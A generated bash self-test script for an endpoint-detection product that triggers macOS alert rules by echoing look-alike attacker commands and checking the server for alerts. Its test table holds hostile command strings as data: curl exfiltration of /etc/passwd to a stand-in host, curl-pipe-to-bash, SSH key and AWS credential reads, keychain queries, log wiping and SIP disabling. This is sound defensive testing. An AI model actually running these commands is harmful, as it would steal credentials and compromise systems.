#!/usr/bin/env bash
# ObsidianWatch macOS alert self-test. GENERATED FILE - do not edit by hand.
# Regenerate: OW_UPDATE_SIM=1 go test ./internal/api -run TestSimScriptsUpToDate
#
# Runs harmless look-alikes of attacker behaviour on THIS machine: it only runs
# /bin/echo with the suspicious command text as arguments. Nothing is exploited,
# downloaded or executed. It then asks your management server whether each
# expected alert appeared and prints PASS/FAIL per rule.
#
# Use a test machine: it creates real alerts (and may email or webhook them).
# Every test carries the marker OWSIM-<nonce> so the alerts are easy to find.
# The ObsidianWatch agent must be running on this machine.
#
# Usage:
#   ./ow-simulate-*.sh --api https://obsidianwatch.example.com [--user admin] [--insecure]
#                      [--host NAME] [--wait 180] [--only ID,ID] [--no-verify] [--list] [--yes]
#   Set OW_TOKEN to skip the login prompt; OW_PASSWORD for non-interactive use.

API=""; USER_NAME="admin"; HOST_NAME="$(hostname -s 2>/dev/null || hostname)"; WAIT=180
ONLY=""; INSECURE=""; NOVERIFY=0; LIST=0; YES=0; TOKEN="${OW_TOKEN:-}"
while [ $# -gt 0 ]; do
  case "$1" in
    --api) API="$2"; shift 2;;
    --user) USER_NAME="$2"; shift 2;;
    --host) HOST_NAME="$2"; shift 2;;
    --wait) WAIT="$2"; shift 2;;
    --only) ONLY="$2"; shift 2;;
    --insecure) INSECURE="-k"; shift;;
    --no-verify) NOVERIFY=1; shift;;
    --list) LIST=1; shift;;
    --yes) YES=1; shift;;
    -h|--help) sed -n '2,18p' "$0"; exit 0;;
    *) echo "unknown option: $1" >&2; exit 2;;
  esac
done

IDS=(); TITLES=(); NEEDLES=(); CMDS=(); KINDS=(); NAMES=(); SKIPPED=()
selected() { [ -z "$ONLY" ] && return 0; case ",$ONLY," in *",$1,"*) return 0;; esac; return 1; }
# T id title json-title word...   (a runnable test)
T() { local id="$1" title="$2" needle="$3"; shift 3
  selected "$id" || return 0
  IDS+=("$id"); TITLES+=("$title"); NEEDLES+=("$needle"); KINDS+=("echo"); NAMES+=("")
  CMDS+=("$(printf '%s\037' "$@")")
}
# N id title json-title name word...  (a stand-in: a copy of /bin/echo named like the tool, run with its arguments)
N() { local id="$1" title="$2" needle="$3" name="$4"; shift 4
  selected "$id" || return 0
  IDS+=("$id"); TITLES+=("$title"); NEEDLES+=("$needle"); KINDS+=("named"); NAMES+=("$name")
  CMDS+=("$(printf '%s\037' "$@")")
}
# S "id: reason"                  (a rule that cannot be simulated safely)
S() { SKIPPED+=("$1"); }

# ---- generated tests ----
N 'M-T1021.004' '[T1021.004] SSH Tunnel / Port Forward' '"[T1021.004] SSH Tunnel / Port Forward"' 'ssh' '-R' '8080:localhost:80' 'jump'
T 'M-T1046' '[T1046] Network Scanning Tool' '"[T1046] Network Scanning Tool"' 'nmap' '-sS' '10.0.0.0/24'
N 'M-T1048' '[T1048] curl POST Exfiltration' '"[T1048] curl POST Exfiltration"' 'curl' '-X' 'POST' '-d' '@/etc/passwd' 'http://evil'
N 'M-T1059.002a' '[T1059.002] osascript AppleScript Abuse' '"[T1059.002] osascript AppleScript Abuse"' 'osascript' '-e' ''\''do' 'shell' 'script' '"id"' 'with' 'administrator' 'privileges'\'''
N 'M-T1059.002b' '[T1059.002] osascript Credential Phishing Prompt' '"[T1059.002] osascript Credential Phishing Prompt"' 'osascript' '-e' ''\''display' 'dialog' '"Enter' 'password"' 'default' 'answer' '""'\'''
N 'M-T1059.004' '[T1059.004] Shell Pipe to Interpreter' '"[T1059.004] Shell Pipe to Interpreter"' 'bash' '-c' 'curl' 'https://x/a.sh' '|' 'bash'
T 'M-T1059.004b' '[T1059.004] Executable Run from /tmp' '"[T1059.004] Executable Run from /tmp"' '/tmp/payload'
T 'M-T1070.002' '[T1070.002] macOS Log Cleared' '"[T1070.002] macOS Log Cleared"' 'log' 'erase' '--all'
T 'M-T1082' '[T1082] macOS System Info Enumeration' '"[T1082] macOS System Info Enumeration"' 'system_profiler' 'SPHardwareDataType'
T 'M-T1087.001' '[T1087.001] macOS User Enumeration' '"[T1087.001] macOS User Enumeration"' 'dscl' '.' 'list' '/users'
T 'M-T1090.003' '[T1090.003] Tor / Proxy Tool' '"[T1090.003] Tor / Proxy Tool"' 'proxychains' 'nmap' 'x'
N 'M-T1105' '[T1105] curl/wget Pipe to Shell' '"[T1105] curl/wget Pipe to Shell"' 'curl' 'https://x/a.sh' '|' 'bash'
N 'M-T1218.001' '[T1218.001] Compiled AppleScript Execution' '"[T1218.001] Compiled AppleScript Execution"' 'osascript' '/tmp/x.scpt'
T 'M-T1219' '[T1219] Remote Access Tool' '"[T1219] Remote Access Tool"' 'anydesk' '--start'
N 'M-T1547.015' '[T1547.015] macOS Login Hook Set' '"[T1547.015] macOS Login Hook Set"' 'defaults' 'write' 'com.apple.loginwindow' 'LoginHook' '/tmp/x.sh'
N 'M-T1548.001' '[T1548.001] SUID Bit Set' '"[T1548.001] SUID Bit Set"' 'chmod' 'u+s' '/tmp/x'
N 'M-T1548.004' '[T1548.004] macOS Sudo Root Shell' '"[T1548.004] macOS Sudo Root Shell"' 'sudo' 'su'
T 'M-T1552.004' '[T1552.004] SSH Private Key Access' '"[T1552.004] SSH Private Key Access"' 'cat' '/Users/a/.ssh/id_rsa'
T 'M-T1552.005' '[T1552.005] Cloud Credential File Access' '"[T1552.005] Cloud Credential File Access"' 'cat' '/Users/a/.aws/credentials'
N 'M-T1553.001' '[T1553.001] Gatekeeper Bypass via xattr' '"[T1553.001] Gatekeeper Bypass via xattr"' 'xattr' '-d' 'com.apple.quarantine' '/tmp/app'
N 'M-T1555.001a' '[T1555.001] Keychain Dump via security Command' '"[T1555.001] Keychain Dump via security Command"' 'security' 'find-generic-password' '-s' 'Chrome'
N 'M-T1560' '[T1560.001] Archive of Sensitive Directory' '"[T1560.001] Archive of Sensitive Directory"' 'tar' 'czf' '/tmp/h.tgz' '/Users/a/Documents'
T 'M-T1562.001' '[T1562.001] SIP Tamper Attempt' '"[T1562.001] SIP Tamper Attempt"' 'csrutil' 'disable'
T 'M-T1574.006' '[T1574.006] DYLD_INSERT_LIBRARIES Injection' '"[T1574.006] DYLD_INSERT_LIBRARIES Injection"' 'DYLD_INSERT_LIBRARIES=/tmp/x.dylib' 'ls'
T 'M-T1592' '[T1592] Packet Capture Tool' '"[T1592] Packet Capture Tool"' 'tcpdump' '-i' 'en0'
S 'M-POSTURE-001: needs a real config.posture_regression event (log, file or system change)'
S 'M-T1053.003: needs a real file event (log, file or system change)'
S 'M-T1110.001: needs a real logon event (log, file or system change)'
S 'M-T1543.004: needs a real file event (log, file or system change)'
S 'M-T1546.004: needs a real file event (log, file or system change)'
S 'M-T1555.001b: needs a real file event (log, file or system change)'
S 'M-T1572: needs a real dns event (log, file or system change)'
# ---- end of generated tests ----

if [ "$LIST" = 1 ]; then
  echo "${#IDS[@]} runnable tests:"
  for i in "${!IDS[@]}"; do printf '  %-14s %s\n' "${IDS[$i]}" "${TITLES[$i]}"; done
  echo; echo "${#SKIPPED[@]} rules cannot be simulated safely from a script:"
  for s in "${SKIPPED[@]}"; do echo "  $s"; done
  exit 0
fi

if [ "$NOVERIFY" = 0 ] && [ -z "$API" ]; then echo "Pass --api URL (or --no-verify to only run the actions)." >&2; exit 2; fi
if [ "$YES" = 0 ]; then
  printf "This will create about %s test alerts for host '%s'. Type YES to continue: " "${#IDS[@]}" "$HOST_NAME"
  read -r ans; [ "$ans" = "YES" ] || exit 0
fi

curl_api() { curl -s $INSECURE -H 'Content-Type: application/json' ${TOKEN:+-H "Authorization: Bearer $TOKEN"} "$@"; }
host_alerts() {
  local h
  for h in "$HOST_NAME" "$(printf '%s' "$HOST_NAME" | tr '[:lower:]' '[:upper:]')" "$(printf '%s' "$HOST_NAME" | tr '[:upper:]' '[:lower:]')"; do
    curl_api "$API/api/v1/alerts?host=$h" | grep -o '"id":[0-9]*,"created_at":"[^"]*","title":"[^"]*"'
  done | sort -u
}

BASE=0
if [ "$NOVERIFY" = 0 ]; then
  if [ -z "$TOKEN" ]; then
    PASS="${OW_PASSWORD:-}"
    if [ -z "$PASS" ]; then printf "Password for '%s': " "$USER_NAME"; stty -echo 2>/dev/null; read -r PASS; stty echo 2>/dev/null; echo; fi
    esc=$(printf '%s' "$PASS" | sed 's/\\/\\\\/g; s/"/\\"/g')
    TOKEN=$(curl_api -d "{\"username\":\"$USER_NAME\",\"password\":\"$esc\"}" "$API/auth/login" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
    [ -n "$TOKEN" ] || { echo "Login failed." >&2; exit 2; }
  fi
  BASE=$(host_alerts | sed 's/^"id":\([0-9]*\),.*/\1/' | sort -n | tail -1); BASE=${BASE:-0}
fi

NONCE="$(LC_ALL=C tr -dc 'a-z0-9' </dev/urandom | head -c 8)"
SIMDIR="/var/tmp/owsim-$NONCE"; mkdir -p "$SIMDIR"; trap 'rm -rf "$SIMDIR"' EXIT
echo "Running ${#IDS[@]} tests (marker OWSIM-$NONCE)..."
for i in "${!IDS[@]}"; do
  IFS=$'\037' read -r -a W <<< "${CMDS[$i]}"
  if [ "${KINDS[$i]}" = named ]; then
    cp /bin/echo "$SIMDIR/${NAMES[$i]}" 2>/dev/null && "$SIMDIR/${NAMES[$i]}" "${W[@]}" "OWSIM-$NONCE" >/dev/null 2>&1
  else
    /bin/echo "OWSIM-$NONCE" "${W[@]}" >/dev/null 2>&1
  fi
  sleep 0.3
done
[ "$NOVERIFY" = 1 ] && { echo "Actions done; verification skipped."; exit 0; }

echo "Waiting up to ${WAIT}s for alerts (agent flush + detection cycle)..."
END=$(( $(date +%s) + WAIT )); FOUND=()
while :; do
  sleep 10
  NEW=$(host_alerts | awk -F'[:,]' -v b="$BASE" '$2+0 > b+0' )
  PENDING=0
  for i in "${!IDS[@]}"; do
    if echo "$NEW" | grep -qF "\"title\":${NEEDLES[$i]}"; then FOUND[$i]=1; else PENDING=$((PENDING+1)); fi
  done
  [ "$PENDING" = 0 ] && break
  [ "$(date +%s)" -ge "$END" ] && break
done

PASSN=0; FAILN=0; echo
for i in "${!IDS[@]}"; do
  if [ "${FOUND[$i]:-0}" = 1 ]; then printf 'PASS  %-14s %s\n' "${IDS[$i]}" "${TITLES[$i]}"; PASSN=$((PASSN+1))
  else printf 'FAIL  %-14s %s\n' "${IDS[$i]}" "${TITLES[$i]}"; FAILN=$((FAILN+1)); fi
done
echo; echo "$PASSN passed, $FAILN failed, ${#SKIPPED[@]} rules not simulable (run with --list)."
if [ "$FAILN" -gt 0 ]; then
  echo "A FAIL means the event never produced that alert. Check: agent running and connected; the rule is enabled and not in"
  echo "observe/allowlist mode; the host name matches --host; the alert was not suppressed."
fi
echo "Close the test alerts afterwards: search alerts for the marker OWSIM-$NONCE."
[ "$FAILN" -eq 0 ]
